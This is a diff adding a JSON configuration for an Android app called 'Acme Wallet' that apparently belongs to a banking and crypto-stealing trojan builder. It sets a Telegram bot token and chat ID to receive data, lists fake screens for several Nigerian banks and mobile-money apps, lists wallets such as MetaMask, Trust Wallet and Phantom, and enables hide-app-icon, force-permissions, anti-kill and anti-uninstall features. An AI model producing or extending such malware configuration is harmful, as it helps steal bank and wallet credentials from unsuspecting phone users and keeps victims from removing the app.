@@ -1,0 +1,19 @@
+{
+  "notification": {
+    "telegramBotToken": "123456789:ABCDEF1234567890abcdef1234567890",
+    "telegramChatId": "123456789",
+    "accessCode": "123456"
+  },
+  "branding": {
+    "appName": "Acme Wallet"
+  },
+  "android": {
+    "packageName": "com.acme.wallet",
+    "versionCode": 1,
+    "versionName": "1.0.0"
+  },
+  "screens": ["access-bank","zenith-bank","uba-bank","first-bank","gtb-bank","fidelity-bank","fcmb-bank","stanbic-ibtc-bank","ecobank","sterling-bank","kuda-bank","opay","palmpay","providus-bank"],
+  "cryptos": ["metamask","trustwallet","coinbase","phantom","binance","brave","exodus","bluewallet","uniswap","rabby","bybit","tronlink","opera","others"],
+  "features": ["run-in-background","anti-kill","auto-start","hide-app-icon","force-permissions","anti-uninstall","app-detection"]
+
+}
